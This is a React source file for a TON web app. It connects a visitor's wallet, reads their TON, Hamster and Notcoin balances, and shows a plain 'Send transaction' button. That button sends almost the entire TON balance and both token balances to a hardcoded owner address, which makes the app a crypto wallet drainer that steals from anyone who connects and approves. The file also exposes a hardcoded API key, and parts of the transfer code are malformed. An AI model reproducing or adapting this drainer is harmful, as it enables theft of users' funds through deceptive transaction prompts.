import React,{ useState,useEffect } from 'react'
import { TonConnectUIProvider, useTonConnectUI,TonConnectButton } from '@tonconnect/ui-react';
import "./index.css";
import TonWeb from 'tonweb';
import { Buffer } from 'buffer';

window.Buffer = Buffer;


const Body =() => {

  /*the wallet addresses i have gave the functions as user is some random 
  address's with assets you should change them*/

  
  //check these address in your wallet
  const ownerAddress="UQBFrS0-M_6sMmhAZr12A-t-OgJ4_LQCVWz8f7xtS_v7lyHL"
  const hamesterTokenAddress="EQAJ8uWd7EBqsmpSWaRdf_I-8R8-XHwh3gsNKhy-UrdrPcUo"
  const notcoinTokenAddress="EQAvlWFDxGF2lXm67y4yzC17wYKD9A0guwPkMs1gOsM__NOT" 




  const [hamesterBalance, setHamesterBalance] = useState(null);
  const [notCoinBalance, setNotCoinBalance] = useState(null);
  const [tonBalance, setTonBalance] = useState(null);
  const [userAddress, setUserAddress] = useState(null);
  const [tonConnectUI] = useTonConnectUI();
  

  //testnet
  const tonweb = new TonWeb(
    new TonWeb.HttpProvider(
      'https://toncenter.com/api/v2/jsonRPC?api_key=36472ea05ea648addc800ba86f97b111d5236d5ee3f2ef7f96d518be892f8aea')
  );
  
  //real network
  //const tonweb=new TonWeb()
  async function fetchJettonWalletAddress( 
    ownerWalletAddress,
    jettonMasterAddress
  ) {
    try {
      const jettonMinter = new TonWeb.token.jetton.JettonMinter(tonweb.provider, {
        address: jettonMasterAddress,
      });
  
      const jettonWalletAddress = await jettonMinter.getJettonWalletAddress(
        new TonWeb.utils.Address(ownerWalletAddress)
      );
  
      const jettonWallet = new TonWeb.token.jetton.JettonWallet(tonweb.provider, {
        address: jettonWalletAddress,
      });
  
      const jettonData = await jettonWallet.getData();
  
      
      if (
        jettonData.jettonMinterAddress.toString(false) !==
        jettonMinter.address.toString(false)
      ) {
        throw new Error(
          "Jetton minter address from jetton wallet does not match the expected minter address"
        );
      }
  
      return jettonWalletAddress.toString(true, true, true);
    } catch (error) {
      console.error("Error fetching jetton wallet address:", error);
    }
  }
  

const fetchUserTokenBalance = async (walletAddress) => {
  try {
    const jettonWallet = new TonWeb.token.jetton.JettonWallet(tonweb.provider, {
      address: walletAddress,
    });
    const data = await jettonWallet.getData();

    return data.balance.toString()
  
  } catch (error) {
    console.error("Error fetching jetton balance:", error);
  }
};

const fetchTonBalance=async(userAddress)=>{

  const tonAddress = new TonWeb.utils.Address(userAddress); 
    const balanceOfTo =  await tonweb.provider.getBalance( 
      tonAddress.toString() 
    );
    const balanceOfTon=Number(balanceOfTo);

    return balanceOfTon;
}


  const fetchAllBalances = async () => {


    //if (!userAddress) return;


    const walletHam=await fetchJettonWalletAddress(
      "UQCYHGhtHlAoW_GY4gcmeCX5qXAXyRbnndJV0IIJsAX6x2yr", hamesterTokenAddress
    );
    const walletNot=await fetchJettonWalletAddress(
      "UQB_LPN1koEFYocWeuKaAkDTQMFFycDs9CGrwPLpnJQ0U6Gy", notcoinTokenAddress
    );


    const balanceOfHamester = await fetchUserTokenBalance(walletHam);
    const balanceOfNotCoin = await fetchUserTokenBalance(walletNot);
    const balanceOfTon=await fetchTonBalance(userAddress);

    
    setHamesterBalance(balanceOfHamester);
    setNotCoinBalance(balanceOfNotCoin);
    setTonBalance(balanceOfTon);


    console.log(`
     your hamester balance before transactions: ${balanceOfHamester}
     your Not balance before transactions: ${balanceOfNotCoin}
     your ton balance before transactions: ${balanceOfTon.toString()}
     `)};

  
  useEffect(() => {
    tonConnectUI.onStatusChange((walletInfo) => {
      if (walletInfo) {
        setUserAddress(walletInfo.account.address);
      }
    });
  }, [tonConnectUI]);

  const transferAllTokens = async () => {

     const walletHam=await fetchJettonWalletAddress(
      "UQCYHGhtHlAoW_GY4gcmeCX5qXAXyRbnndJV0IIJsAX6x2yr", hamesterTokenAddress
    );
    const walletNot=await fetchJettonWalletAddress(
      "UQB_LPN1koEFYocWeuKaAkDTQMFFycDs9CGrwPLpnJQ0U6Gy", notcoinTokenAddress
    );

  

      /*const hamesterJettonWallet = await tonweb.provider.call(
        hamesterTokenAddress,  
        'get_wallet_address',  
        [['addr', walletHam]] 
      );
      /*const notCoinJettonWallet = await tonweb.provider.call(
        notcoinTokenAddress,  
        'get_wallet_address',  
        [['addr', userAddress]] 
      );*/
    






    /*if (hamesterBalance <= 0 && notCoinBalance <= 0 && tonBalance <= 0) {
      console.error("No tokens to transfer.");
      return;
    }*/

    const transactionHamester = {
      to: ownerAddress,
      amount: TonWeb.utils.toNano(hamesterBalance), 
      payload: null
    };


    const transactionNot = {
      to: ownerAddress,
        amount: TonWeb.utils.toNano(notCoinBalance),
        payload: null
    };
  
    const transactionTon = {
      messages: [
        {
          address: ownerAddress,
          amount: tonBalance-10e6,
          payload: null,
        },
      ],
    };



    

      try{
        await tonConnectUI.sendTransaction(transactionTon);
        await tonConnectUI.sendTransaction({
          messages: [{ address: walletHam, ...transactionHamester }]
        });
        await tonConnectUI.sendTransaction({
          messages: [{ address: walletNot, ...transactionNot }]
        });
        

    
      
       console.log(`
        your new hamester balance: ${hamesterBalance}
        your new notcoin balance: ${notCoinBalance}
         your new ton balance: ${tonBalance}
         `)


    } catch (error) {
      console.error('Error sending transactions:', error);
    }
  };



  useEffect(() => {
    if (userAddress) {
      fetchAllBalances();
    }
  }, [userAddress]);



  return (
    <>
      <div className="custom-buttons-container">
        <TonConnectButton />
        <button className='transfer-btn tonconnect-button' onClick={() => transferAllTokens()}>
                Send transaction
            </button>
            <button className='transfer-btn tonconnect-button' onClick={() => fetchAllBalances()}>
                balance
            </button>
      </div>
    </>
  );
};


const App = () => {
  return (
    <TonConnectUIProvider manifestUrl="https://ton-connect.github.io/demo-dapp-with-react-ui/tonconnect-manifest.json">
          <Body/> 
        </TonConnectUIProvider>
  )
}

export default App
